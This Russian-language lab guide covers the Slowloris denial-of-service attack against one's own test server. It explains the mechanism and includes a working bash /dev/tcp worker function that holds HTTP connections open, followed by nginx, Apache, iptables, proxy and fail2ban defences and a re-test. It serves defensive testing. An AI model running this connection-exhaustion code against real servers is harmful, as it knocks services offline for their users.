# Лабораторная работа: Slowloris — атака и защита

**Цель:** проверить устойчивость собственного веб-сервера к атаке типа Slowloris (истощение пула соединений за счёт медленных/неполных HTTP-запросов), затем закрыть уязвимость и убедиться, что защита работает.

**Область применения:** сервер, которым вы владеете и управляете (локальная VM, домашний сервер, свой VPS). Не применять к чужим доменам/IP.

---

## 1. Как работает Slowloris

Веб-сервер выделяет под каждое TCP-соединение поток/воркер и держит его открытым, пока не получит **полный** HTTP-запрос (заголовки, заканчивающиеся `\r\n\r\n`). Slowloris:

1. Открывает много TCP-соединений к серверу (порт 80/443).
2. Отправляет по каждому соединению начало запроса (`GET / HTTP/1.1\r\n`) и один заголовок.
3. Каждые 10–15 секунд досылает ещё один произвольный заголовок (`X-a: b\r\n`), не завершая запрос.
4. Сервер держит соединение открытым в ожидании конца заголовков → при достаточном числе соединений исчерпывается лимит воркеров/файловых дескрипторов → новые (легитимные) клиенты не могут подключиться.

Атака эффективна против серверов с потоковой/процессной моделью на соединение (старый Apache prefork) и почти бесполезна против event-driven серверов (nginx, современный Apache event MPM) — но и на них можно исчерпать `worker_connections`, если не настроены таймауты.

## 2. Тестовый стенд

Разверните сервер, который вы будете атаковать — **отдельно**, не production:

```bash
# Вариант А: простой контейнер с Apache (уязвим по умолчанию к Slowloris сильнее, чем nginx)
docker run -d --name slowloris-target -p 8080:80 httpd:2.4

# Вариант Б: nginx для сравнения
docker run -d --name slowloris-target-nginx -p 8081:80 nginx:alpine
```

Проверка, что сервер жив:
```bash
curl -I http://127.0.0.1:8080/
```

## 3. Скрипт атаки (bash, через `/dev/tcp`)

Держит N параллельных "полуоткрытых" соединений к целевому серверу и досылает заголовки, не завершая запрос.

**Файл:** `slowloris.sh`

Параметры:
- `-h host` — цель (по умолчанию 127.0.0.1)
- `-p port` — порт (по умолчанию 8080)
- `-c connections` — число соединений (по умолчанию 200)
- `-i interval` — интервал досылки заголовка в секундах (по умолчанию 10)
- `-t timeout` — общая длительность теста в секундах (по умолчанию 0 = бесконечно, Ctrl+C для остановки)

Логика одного "воркера":
```bash
worker() {
    local id=$1
    exec {fd}<>"/dev/tcp/$HOST/$PORT" 2>/dev/null || return 1
    printf 'GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: keep-alive\r\n' \
        "$RANDOM$id" "$HOST" >&"$fd" 2>/dev/null || { exec {fd}>&-; return 1; }

    while true; do
        sleep "$INTERVAL"
        printf 'X-a: %s\r\n' "$RANDOM" >&"$fd" 2>/dev/null || break
    done
    exec {fd}>&-
}
```

Главный цикл запускает `worker` в фоне `C` раз, отслеживает живые PID, раз в 5 секунд печатает статистику (сколько соединений живы), по `SIGINT`/таймауту — гасит все фоновые процессы (`trap ... EXIT`, `kill $(jobs -p)`).

**Мониторинг результата** — в отдельном терминале, во время атаки:
```bash
# число установленных соединений на целевом порту
watch -n1 'ss -tan state established "( dport = :8080 or sport = :8080 )" | wc -l'

# доступность сервера "снаружи" — контрольный запрос
while true; do curl -m 3 -o /dev/null -s -w "%{http_code} %{time_total}s\n" http://127.0.0.1:8080/; sleep 2; done
```

Если сервер уязвим — контрольные `curl` начнут таймаутиться/зависать, как только число соединений упрётся в лимит воркеров.

## 4. Методы защиты

### 4.1 nginx (изначально устойчив, но зафиксируем явно)
```nginx
http {
    client_header_timeout 10s;   # закрыть соединение, если заголовки не пришли за 10с
    client_body_timeout   10s;
    keepalive_timeout     15s 15s;
    send_timeout          10s;

    limit_conn_zone $binary_remote_addr zone=addr:10m;
    server {
        limit_conn addr 20;      # не более 20 одновременных соединений с одного IP
        ...
    }
}
```

### 4.2 Apache
```apache
# mod_reqtimeout (обычно включён по умолчанию в актуальных версиях)
RequestReadTimeout header=10-20,MinRate=500 body=20,MinRate=500

# Использовать event MPM вместо prefork
# /etc/apache2/mods-available/mpm_event.conf — увеличить ThreadsPerChild, MaxRequestWorkers
```

### 4.3 На уровне ОС / фаервола
```bash
# ограничение новых соединений с одного IP в единицу времени (iptables)
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j REJECT
```

### 4.4 Reverse proxy / CDN
Cloudflare, любой reverse-proxy с буферизацией запроса (nginx перед бэкендом) — прокси сам накапливает заголовки и передаёт бэкенду только полный запрос, поэтому Slowloris "упирается" в прокси, а не в приложение. Прокси настраивается так же (п. 4.1) под собственные таймауты.

### 4.5 fail2ban
Правило, банящее IP, открывающие аномально много соединений за короткое время (парсинг логов доступа/`ss`).

---

## 5. Проверка защиты

Повторить атаку из п.3 после применения настроек п.4 — контрольные `curl`-запросы должны продолжать получать `200 OK` быстро, а `ss` — показывать, что число соединений с одного IP не растёт бесконечно (упирается в `limit_conn`/`connlimit`).
